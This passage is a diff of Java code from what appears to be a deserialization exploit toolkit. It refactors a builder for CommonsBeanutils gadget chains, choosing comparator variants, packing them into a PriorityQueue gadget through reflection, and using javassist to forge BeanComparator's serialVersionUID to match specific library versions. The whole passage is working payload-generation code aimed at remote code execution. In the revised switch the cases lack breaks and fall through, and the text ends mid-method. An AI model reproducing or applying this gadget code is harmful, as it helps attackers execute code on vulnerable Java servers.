@@ -1,20 +1,11 @@
 package com.ppp.chain.commonsbeanutils;
 
 import com.ppp.Printer;
-import com.ppp.utils.RanDomUtils;
 import com.ppp.utils.Reflections;
-import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
-import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
-import javassist.CtField;
-import org.apache.commons.beanutils.BeanComparator;
-import org.apache.commons.collections.comparators.ReverseComparator;
+import javassist.*;
 import org.apache.commons.lang3.compare.ObjectToStringComparator;
 import org.apache.logging.log4j.util.PropertySource;
 
-import java.math.BigInteger;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
@@ -23,87 +14,81 @@ import java.util.PriorityQueue;
  */
 public class BeanComparatorBuilder {
     enum CompareEnum {
-        BeanComparator, CaseInsensitiveComparator, AttrCompare, ObjectToStringComparator, PropertySource, ReverseComparatorCC, ReverseComparatorJDK
+        BeanComparator, CaseInsensitiveComparator, AttrCompare, ObjectToStringComparator, PropertySource, ReverseComparator
     }
 
-    private static Object DEFAULT_QUEUE_PARAM = RanDomUtils.generateRandomString(1);
-    private static String V_1_83 = "1.8.3";
-
-    public static Object scheduler(CompareEnum compareEnum, Object templates, String version) throws Exception {
+    public static Comparator scheduler(CompareEnum compareEnum, CBVersionEnum cbVersionEnum) throws Exception {
+        Comparator comparator = comparatorScheduler(cbVersionEnum);
         switch (compareEnum) {
             case BeanComparator:
-                BeanComparator comparator = new BeanComparator("lowestSetBit");
-                return queueGadgetMaker(comparatorScheduler(comparator, version), templates, new BigInteger("1"));
+                Reflections.setFieldValue(comparator, "property", "lowestSetBit");
             case CaseInsensitiveComparator:
-                BeanComparator comparator1 = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
-                return queueGadgetMaker(comparatorScheduler(comparator1, version), templates, DEFAULT_QUEUE_PARAM);
+                Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);
             case AttrCompare:
-                AttrNSImpl attrNS = new AttrNSImpl(new CoreDocumentImpl(), "1", "1", "1");
-//                BeanComparator comparator2 = new BeanComparator(null, new AttrCompare());
-                BeanComparator comparator2 = new BeanComparator(null, (Comparator<?>) Class.forName("com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare").newInstance());
-                return queueGadgetMaker(comparatorScheduler(comparator2, version), templates, attrNS);
+                Reflections.setFieldValue(comparator, "comparator", Class.forName("com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare").newInstance());
             case ObjectToStringComparator:
-                BeanComparator comparator3 = new BeanComparator(null, new ObjectToStringComparator());
-                return queueGadgetMaker(comparatorScheduler(comparator3, version), templates, DEFAULT_QUEUE_PARAM);
+                Reflections.setFieldValue(comparator, "comparator", new ObjectToStringComparator());
             case PropertySource:
-                PropertySource propertySource = new PropertySource() {
-                    @Override
-                    public int getPriority() {
-                        return 0;
-                    }
-
-                };
-                BeanComparator comparator4 = new BeanComparator(null, new PropertySource.Comparator());
-                return queueGadgetMaker(comparatorScheduler(comparator4, version), templates, propertySource);
-            case ReverseComparatorCC:
-                BeanComparator comparator5 = new BeanComparator(null, new ReverseComparator());
-                return queueGadgetMaker(comparatorScheduler(comparator5, version), templates, DEFAULT_QUEUE_PARAM);
-            case ReverseComparatorJDK:
-                BeanComparator comparator6 = new BeanComparator(null, (Comparator<?>) Reflections.newInstance("java.util.Collections$ReverseComparator"));
-                return queueGadgetMaker(comparatorScheduler(comparator6, version), templates, DEFAULT_QUEUE_PARAM);
+                Reflections.setFieldValue(comparator, "comparator", new PropertySource.Comparator());
+            case ReverseComparator:
+                // cc3 cc4 也有一个名字一个的利用类
+                Reflections.setFieldValue(comparator, "comparator", Reflections.newInstance("java.util.Collections$ReverseComparator"));
         }
-        return null;
+        return comparator;
     }
 
-    public static Object queueGadgetMaker(Comparator comparator, Object templates, Object queueParam) throws Exception {
+    public static Object queueGadgetMaker(Comparator comparator, Object object, Object queueParam, String value) throws Exception {
         final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
         queue.add(queueParam);
         queue.add(queueParam);
 
-        Reflections.setFieldValue(comparator, "property", "outputProperties");
-        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});
+        Reflections.setFieldValue(comparator, "property", value);
+        Reflections.setFieldValue(queue, "queue", new Object[]{object, object});
 
         return queue;
     }
 
-    public static Comparator comparatorScheduler(Comparator comparator, String version) throws Exception {
-        if (version.equals(V_1_83)) {
-            BeanComparatorBuilder beanComparatorBuilder = new BeanComparatorBuilder();
-            Comparator result = beanComparatorBuilder.createBeanComparator();
-            Reflections.setFieldValue(result, "comparator", comparator);
-            return result;
-        } else {
-            Printer.log("Use default cb version");
-            return comparator;
+    public static Comparator comparatorScheduler(CBVersionEnum cbVersionEnum) throws Exception {
+        long serialVersionUID = CBVersionEnum.Default.getSerialVersionUID();
+        switch (cbVersionEnum) {
+            case V_1_8_3:
+                serialVersionUID = CBVersionEnum.V_1_8_3.getSerialVersionUID();
+                break;
+            case V_1_6:
+                serialVersionUID = CBVersionEnum.V_1_6.getSerialVersionUID();
+                break;
+            case V_1_5:
+                serialVersionUID = CBVersionEnum.V_1_5.getSerialVersionUID();
+                break;
         }
+
+        if (serialVersionUID != 0) {
+            Printer.yellowInfo("serialVersionUID: " + serialVersionUID);
+        }
+
+        return new BeanComparatorBuilder().createBeanComparator(serialVersionUID);
     }
 
     /**
      * 修改BeanComparator类的serialVersionUID
      */
-    public Comparator createBeanComparator() {
+    public Comparator createBeanComparator(long serialVersionUID) {
         try {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
-            final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
+            CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
             try {
                 CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
                 ctBeanComparator.removeField(ctSUID);
-            } catch (javassist.NotFoundException e) {
+            } catch (NotFoundException e) {
             }
-            ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
-            final Comparator beanComparator = (Comparator) ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
+            if (serialVersionUID != 0) {
+                ctBeanComparator.addField(CtField.make(String.format("private static final long serialVersionUID = %dL;", serialVersionUID), ctBeanComparator));
+            }
+
+            Comparator beanComparator = (Comparator) ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
             ctBeanComparator.defrost();
+
             return beanComparator;
         } catch (Exception e) {
 
